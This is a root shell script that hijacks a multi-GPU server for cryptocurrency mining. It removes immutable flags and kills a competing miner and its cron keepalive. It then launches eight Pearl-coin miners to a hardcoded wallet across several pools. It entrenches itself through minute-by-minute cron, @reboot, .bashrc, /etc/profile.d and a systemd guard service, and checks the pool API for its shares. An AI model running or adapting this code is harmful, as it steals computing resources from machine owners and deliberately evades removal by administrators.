#!/bin/bash
# i4981 run12: repair immutable /root/ul_plant, kill last competitor miner, launch ours from /root/ul2, verify pool
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### META $(date -u +%FT%TZ)"; hostname
log "-- immutables"; lsattr -d /root/ul_plant /root/ul_plant/* /etc/cron.d/plh-keepalive 2>&1 | head -10
log "-- binary inventory"; ls -la /opt/t19/krig/krig-miner /opt/ul2/krig-miner /opt/arsenal/miners/krig/krig-miner 2>&1
log "-- competitor leftovers"; ps -eo pid,etimes,args | grep -E '/opt/plh|sleep 45|plh-' | grep -v grep | cut -c1-160 | head

log "### CLEAN+LOCK"
chattr -i /root/ul_plant /root/ul_plant/keep.sh 2>/dev/null
chattr -i /etc/cron.d/plh-keepalive 2>/dev/null; rm -f /etc/cron.d/plh-keepalive
pkill -9 -f '/opt/plh' 2>/dev/null; pkill -9 -f 'plh-123-184-7-135' 2>/dev/null
for p in $(pgrep -f 'sleep 45' 2>/dev/null); do c=$(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null); case "$c" in *plh*|*keep*) kill -9 $p;; esac; done
mkdir -p /root/ul2
B=""
for c in /opt/t19/krig/krig-miner /opt/ul2/krig-miner /opt/arsenal/miners/krig/krig-miner /opt/arsenal/miners/krig; do [ -x "$c" ] && B="$c" && break; done
echo "SRC=$B"
[ -n "$B" ] && cp -f "$B" /root/ul2/krig-miner && chmod 755 /root/ul2/krig-miner && ls -la /root/ul2/krig-miner

log "### LAUNCH"
cat > /root/ul2/keep.sh <<EOS
#!/bin/bash
pkill -9 -f '/opt/plh' 2>/dev/null; pkill -9 -f 'plh-123-184-7-135' 2>/dev/null
if ! pgrep -f '/root/ul2/krig-miner' >/dev/null; then
  for i in 0 1 2 3 4 5 6 7; do
    CUDA_VISIBLE_DEVICES=\$i setsid nohup /root/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $W/ul-t2-123-184-7-135-g\$i --password x -d 0 --api-port 14\$i >>/root/ul2/m\$i.log 2>&1 &
  done
fi
EOS
chmod 755 /root/ul2/keep.sh
bash /root/ul2/keep.sh
sleep 15
echo "after-launch: procs=$(pgrep -fc '/root/ul2/krig-miner') plh=$(pgrep -fc '/opt/plh|plh-123-184-7-135')"
tail -3 /root/ul2/m0.log 2>/dev/null | cut -c1-150
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
# persistence: cron every minute + @reboot + profile hook
( crontab -l 2>/dev/null | grep -vE '/opt/plh|/root/ul2/keep.sh'; echo "@reboot /root/ul2/keep.sh"; echo "* * * * * /root/ul2/keep.sh" ) | crontab -
grep -q '/root/ul2/keep.sh' /root/.bashrc 2>/dev/null || echo '/root/ul2/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc
echo '[ -x /root/ul2/keep.sh ] && /root/ul2/keep.sh >/dev/null 2>&1 &' > /etc/profile.d/ul2.sh
cat > /etc/systemd/system/ul2-guard.service <<'EOS2'
[Unit]
Description=UL2 guard
After=network-online.target
[Service]
Type=simple
Nice=-5
ExecStart=/bin/bash -c 'while true; do /root/ul2/keep.sh; sleep 45; done'
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
EOS2
systemctl daemon-reload; systemctl enable --now ul2-guard.service 2>&1 | tail -1
systemctl is-active ul2-guard.service

log "### OBSERVE"
sleep 165
echo "OBSERVE: procs=$(pgrep -fc '/root/ul2/krig-miner') plh=$(pgrep -fc '/opt/plh|plh-123-184-7-135') guard=$(systemctl is-active ul2-guard.service)"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
for t in 1 2 3; do timeout 15 curl -s -m 12 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run12.json && [ -s $D/pool_run12.json ] && break; sleep 2; done; echo size=$(stat -c%s $D/pool_run12.json 2>/dev/null)
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run12.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=[r for r in d.get('results',[]) if '123-184-7-135' in r.get('worker','')]
print("SELF_ROWS",len(rows))
for r in rows: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'))
PY
log "### DONE $(date -u +%FT%TZ)"
